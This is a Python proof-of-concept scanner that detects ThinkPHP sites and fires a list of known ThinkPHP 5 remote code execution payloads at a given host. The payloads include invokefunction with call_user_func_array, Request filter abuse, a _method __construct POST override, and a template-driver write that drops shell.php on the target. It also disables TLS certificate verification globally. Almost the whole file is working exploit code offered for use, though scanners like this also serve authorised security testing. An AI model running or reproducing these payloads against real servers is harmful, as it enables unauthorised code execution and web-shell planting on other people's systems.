#-*-coding:utf-8-*-

import re
import urllib.request, urllib.error, urllib.parse
import requests
import ssl

ssl._create_default_https_context = ssl._create_unverified_context



def check_thinkphp(url):
	if 'http' in url or 'https' in url:
		try:
			res = urllib.request.urlopen(url, timeout=5)
			res_header = res.headers
			res_html = res.read().decode('utf-8','ignore')
		except urllib.error.HTTPError as e:
			res_header = e.headers
			try:
				res_html = e.read().decode('utf-8','ignore')
			except Exception:
				res_html = ''
		except Exception as e:
			res_html = ''
			res_header = ''
		if re.search('thinkphp',res_html, re.I) or re.search('ThinkPHP',res_header,re.I):
			print("THE url : " + url + " have a service : thinkphp .")
			return True
		else:
			return False
	else:
		return False
	return False

def verify(protocol,ip,port):
	oldurl = protocol+'://'+ip+':'+str(port)
	print('testing if thinkphp5 remote code execution vulnerability')
	payload = [r"/public/index.php?s=captcha",
	r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    r"/?s=index/\think\Request/input&filter=phpinfo&data=1",
    r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    r"/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
    r"/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E",
    r"/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
    r"/public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1",
    r"/index.php/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    r"/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    r"/index.php/?s=index/\\think\Request/input&filter=phpinfo&data=1",
    r"/index.php?s=/index/\\think\\request/cache&key=1|phpinfo",
	r"/index.php/module/action/param1/${@print(md5(666))}"]
	try:
		whethertp = check_thinkphp(oldurl)
		if whethertp == True :
			for i in range(1,13):
				if i==1:
					data = {
						'_method': '__construct',
						'filter[]': 'md5',
						'method': 'get',
						'server[REQUEST_METHOD]': '666'
					}
					url = oldurl+payload[i]
					response = requests.post(url, data,verify=False,timeout=8).text
					if "fae0b27c451c728867a567e8c1bb4e53" in response:
						msg = 'Found thinkphp5 remote code execution vulnerability exists at the target address :' + url + ' .'
						print(msg)
						number = 'v100'
						return True, url, number, msg
					else:
						pass
				else:
					url = oldurl + payload[i]
					response = requests.get(url,verify=False,timeout=5)
					if 'PHP Version' in response.text or "fae0b27c451c728867a567e8c1bb4e53" in response.text:
						msg = 'Found thinkphp5 remote code execution vulnerability exists at the target address :' + url + ' .'
						print(msg)
						number = 'v100'
						return True, url, number, msg
					else:
						pass
		else:
			pass
	except Exception as e:
		msg = str(e)
		number = 'v0'
		return False,oldurl,number,msg
	msg = 'There is no thinkphp5 remote code execution vulnerability'
	number = 'v0'
	return False, oldurl, number, msg














